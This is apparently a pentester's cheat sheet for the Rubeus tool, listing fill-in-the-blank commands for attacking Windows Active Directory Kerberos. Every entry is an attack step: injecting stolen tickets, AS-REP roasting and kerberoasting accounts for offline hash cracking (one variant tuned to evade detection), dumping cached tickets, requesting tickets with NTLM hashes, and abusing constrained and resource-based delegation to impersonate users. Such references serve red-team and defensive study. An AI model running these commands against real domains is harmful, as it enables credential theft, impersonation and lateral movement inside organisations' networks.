# rubeus

% ad, windows, rubeus

## inject ticket from file
.\Rubeus.exe ptt /ticket:<ticket>

## inject ticket from b64 blob
.\Rubeus.exe ptt /ticket:<BASE64BLOBHERE>

## check ASPREPRoast for all users in current domain
.\Rubeus.exe asreproast  /format:<AS_REP_response_format> /outfile:<output_hashes_file>

## ASREPRoast specific user
.\Rubeus.exe asreproast  /user:<user> /domain:<domain_name> /format:<AS_REP_response_format> /outfile:<output_hashes_file>

## kerberoasting - current domain
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file>

## Kerberoasting and outputing on a file with a spesific format
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name>

## Kerberoasting whle being "OPSEC" safe, essentially while not try to roast AES enabled accounts
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /rc4opsec

## Kerberoast AES enabled accounts
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /aes
 
## Kerberoast specific user account
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /user:<user> /simple

## get hash
.\Rubeus.exe hash /user:<user> /domain:<domain_name> /password:<password>

## dump - will dump any relevant cached TGS ticket’s stored
.\Rubeus.exe dump

## ask and inject ticket
.\Rubeus.exe asktgt /user:<user> /domain:<domain_name> /rc4:<ntlm_hash> /ptt

## S4U - with ticket - Contrained delegation
.\Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<user> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /ptt

## S4U - with hash - Constrained delegation
.\Rubeus.exe s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /domain:<domain_name> /ptt

## get rc4 of machine with the password
.\Rubeus.exe hash /password:<machine_password>

## S4U - Resource based contrained delegation
.\Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:<user_to_impersonate> /msdsspn:cifs/<domain_fqdn> /domain:<domain_name> /ptt

= ticket : c:\Temp\ticket.kirbi
= domain_fqdn : MYDC.mydomain.local
= domain_name : mydomain.local
= AS_REP_response_format : hashcat
